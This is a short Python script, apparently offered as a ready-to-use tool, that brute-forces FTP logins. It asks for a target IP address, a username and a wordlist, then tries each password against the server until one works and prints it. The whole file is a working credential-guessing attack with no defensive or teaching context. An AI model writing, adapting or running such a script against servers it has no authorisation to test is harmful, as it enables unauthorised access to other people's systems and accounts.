import ftplib

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

try:
	file1 = open('ftpbrute.txt', 'r')
	print(' ')
	print (bcolors.OKGREEN + file1.read() + bcolors.ENDC)
	file1.close()
except IOError:
	print('\nBanner File not found!')


target = input("Enter target IP Address: ")
username = input("Enter target Username: ")
wordlist = input("Enter wordlist filepath: ")

flag = 0

try:
    passfile = open(wordlist, "r")
except:
    print("No file found !")
    quit()

for passwd in passfile:

    try:
        ftp = ftplib.FTP(target, username, passwd)
        print("[+] {0:*^50}".format("Password found :D"))
        print("[+] Password is: {0}".format(passwd))
        print("[+]{0:*^50}".format(""))
        flag = 1

    except:
        print("[-] Password Trying...{0}".format(passwd))

if (flag == 0):
    print ("Password not found :(")
    print ("Please modify your wordlist !")








